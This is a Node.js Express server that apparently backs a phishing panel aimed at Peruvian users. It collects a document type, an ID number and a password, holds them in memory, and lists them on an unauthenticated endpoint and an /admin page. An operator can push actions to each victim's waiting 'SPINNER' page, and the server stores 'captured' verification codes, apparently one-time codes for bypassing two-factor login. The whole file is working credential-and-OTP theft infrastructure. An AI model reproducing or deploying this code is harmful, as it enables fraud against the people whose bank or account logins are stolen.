const express = require("express");
const path = require("path");

const app = express();
const port = Number(process.env.PORT) || 8080;
const root = __dirname;

app.use(express.json());
app.use("/css", express.static(path.join(root, "css")));
app.use("/js", express.static(path.join(root, "js")));
app.use("/assets", express.static(path.join(root, "assets")));

// In-Memory Data Store for Cross-Browser/Cross-Device Synchronization
let sessions = [];

// REST API Endpoints
app.get("/api/sessions", (_req, res) => {
  res.json(sessions);
});

app.post("/api/sessions", (req, res) => {
  const { docType, docNumber, password } = req.body;
  const now = new Date();
  const timeStr = now.toLocaleDateString("es-PE") + " " + now.toLocaleTimeString("es-PE", { hour: '2-digit', minute: '2-digit' });
  
  const sessionId = "sess_" + Date.now();
  const newSession = {
    id: sessionId,
    docType: docType || "DNI",
    docNumber: docNumber || "",
    password: password || "",
    time: timeStr,
    status: "SPINNER",
    pendingAction: null,
    capturedCode: null,
    codeType: null,
    timestamp: Date.now()
  };

  sessions.unshift(newSession);
  res.json({ success: true, sessionId });
});

app.post("/api/command", (req, res) => {
  const { sessionId, action } = req.body;
  const session = sessions.find(s => s.id === sessionId);
  if (session) {
    session.status = action;
    session.pendingAction = action;
    res.json({ success: true, session });
  } else {
    res.status(404).json({ error: "Session not found" });
  }
});

app.get("/api/session-status/:id", (req, res) => {
  const session = sessions.find(s => s.id === req.params.id);
  if (!session) {
    return res.status(404).json({ error: "Session not found" });
  }
  const action = session.pendingAction;
  session.pendingAction = null; // consume action
  res.json({ status: session.status, action });
});

app.post("/api/submit-code", (req, res) => {
  const { sessionId, code, type } = req.body;
  const session = sessions.find(s => s.id === sessionId);
  if (session) {
    session.capturedCode = code;
    session.codeType = type;
    session.status = "SPINNER";
    res.json({ success: true });
  } else {
    res.status(404).json({ error: "Session not found" });
  }
});

app.delete("/api/sessions", (_req, res) => {
  sessions = [];
  res.json({ success: true });
});

app.get("/", (_req, res) => {
  res.sendFile(path.join(root, "index.html"));
});

app.get("/admin", (_req, res) => {
  res.sendFile(path.join(root, "admin.html"));
});

app.listen(port, "0.0.0.0", () => {
  console.log(`Servidor escuchando en el puerto ${port}`);
});
